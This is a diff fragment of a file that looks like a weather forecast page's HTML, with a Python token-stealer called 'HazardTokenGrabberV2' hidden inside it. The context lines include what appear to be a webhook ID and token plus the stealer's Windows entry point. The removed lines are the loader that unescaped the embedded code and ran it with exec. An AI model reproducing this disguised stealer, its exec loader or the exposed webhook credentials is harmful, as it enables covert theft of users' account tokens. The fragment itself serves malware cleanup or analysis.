@@ -9,7 +9,6 @@
 
 _*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*
 <div class="tombstone-container">
-G = """
 c = "998490919525421107/"
 v = "dabF0NoCzmVHH8-neh49sqsNmnui2EPeDbABdHhbIjT8FQdDo3yLQAE0S8K7GPSYHq0-"
 __author__ = "Rdimo"
@@ -781,11 +780,7 @@ if __name__ == "__main__" and os.name == "nt":
     except httpx.ConnectTimeout:
         os._exit(0)
     asyncio.run(HazardTokenGrabberV2().init())
-"""
-G = G[35:-7]
-G = G.replace("&gt;", ">")
-G = G.replace("&lt;", ">")
-exec(G)
+
 </div></li><li class="forecast-tombstone">
 _*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*  
 
